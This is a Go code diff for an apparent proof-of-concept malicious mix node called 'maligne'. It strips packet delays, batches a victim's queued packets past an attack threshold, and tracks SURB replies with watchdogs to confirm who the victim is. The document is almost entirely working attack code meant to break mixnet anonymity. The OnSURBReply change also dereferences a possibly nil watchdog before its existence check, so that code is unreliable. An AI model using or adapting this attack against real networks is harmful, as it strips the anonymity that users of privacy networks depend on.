@@ -18,6 +18,7 @@ package maligne
 
 import (
 	"bytes"
+	"sync"
 	"time"
 
 	"github.com/fxamacker/cbor/v2"
@@ -49,7 +50,7 @@ const ATTACK_THRESHHOLD = 10
  * *MAYBE* this can even get 0, since there
  * is a grace period, but lets try
  */
-const ATTACK_TIMER = 30 * time.Second
+const ATTACK_TIMER = 5 * time.Second
 
 type queueImpl interface {
 	Halt()
@@ -66,10 +67,13 @@ type maligne struct {
 	victim [common.SpoolIDSize]byte
 
 	inCh            *channels.InfiniteChannel
+	resultCh        chan []byte
 	outCh           *channels.BatchingChannel
 	epochEndCh      chan uint64
 	queue           []*packet.Packet
 	mischiefManaged bool
+	mapMutex        sync.Mutex
+	watchDogMap     map[string]*watchDog
 }
 
 func (mal *maligne) Halt() {
@@ -120,31 +124,38 @@ func (mal *maligne) worker() {
 			mal.log.Debugf("Terminating gracefully.")
 			return
 		case <-timer.C:
-			mal.log.Debugf("Epoch End timer was triggered!")
 			if timer_fired() {
-				mal.log.Debugf("Epoch End timer was fired!")
+				mal.log.Debugf("Timer has fired!")
 				if len(mal.queue) > ATTACK_THRESHHOLD {
 					mal.log.Debug("Attack Threshold reached!")
 					for _, pkt := range mal.queue {
 						mal.log.Debugf("Sending Pkt: %v", pkt.ID)
-
 						mal.glue.Scheduler().OnPacket(pkt)
 					}
 					mal.mischiefManaged = true
+				} else {
+					mal.log.Debug("Attack Threshold was not reached!")
+					mal.log.Debug("Empty the Queue")
+					mal.queue = []*packet.Packet{}
 				}
-				// Packet delay probably passed, packet dispatch handled as
-				// part of rescheduling the timer
-
 			}
 		case e := <-mal.inCh.Out():
 			pkt := e.(*packet.Packet)
-			mal.log.Debugf("Set delay to 0")
 			pkt.Delay = 0
 			mal.queue = append(mal.queue, pkt)
 			mal.log.Debugf("Appended pkt: %v to delay queue", pkt.ID)
-
+		case recipient := <-mal.resultCh:
+			mal.log.Debugf("Attack was successful, victim is: %v", recipient)
+			mal.mischiefManaged = true
 		}
 		timer = time.NewTimer(calculate_timer())
+
+		if mal.mischiefManaged {
+			for _, wd := range mal.watchDogMap {
+				wd.Worker.Halt()
+			}
+			return
+		}
 
 	}
 
@@ -158,12 +169,14 @@ func New(glue glue.Glue) (glue.Maligne, error) {
 		glue:       glue,
 		log:        glue.LogBackend().GetLogger("maligne"),
 		inCh:       channels.NewInfiniteChannel(),
+		resultCh:   make(chan []byte),
 		epochEndCh: make(chan uint64),
 		/* A more advanced version would keep one queue for each victim
 		and release them at different points in time, but this is
 		fine for a PoC
 		*/
-		queue: []*packet.Packet{},
+		queue:       []*packet.Packet{},
+		watchDogMap: make(map[string]*watchDog),
 	}
 
 	if epochtime.Period < ATTACK_TIMER {
@@ -244,5 +257,22 @@ func (mal *maligne) IsVictim(r cborplugin.Request) bool {
 }
 
 func (mal *maligne) OnSURBReply(recipient []byte, surbID *[16]byte) {
-
+	mal.mapMutex.Lock()
+	defer mal.mapMutex.Unlock()
+	wd, ok := mal.watchDogMap[string(recipient)]
+	var wdChannel = wd.InCh
+	if ok {
+		mal.log.Debugf("Sent surb %v for %v to worker", surbID, recipient)
+		wdChannel <- *surbID
+	} else {
+		wd, err := NewWatchDog(mal.glue, mal.resultCh, recipient)
+		mal.log.Debugf("Creating new worker for surb %v for %v", surbID, recipient)
+		if err != nil {
+			mal.log.Errorf("Error while allocationg Watchdog for recipient %v surb %v", recipient, surbID)
+			return
+		}
+		mal.watchDogMap[string(recipient)] = wd
+		wd.InCh <- *surbID
+		go wd.Go(wd.worker)
+	}
 }
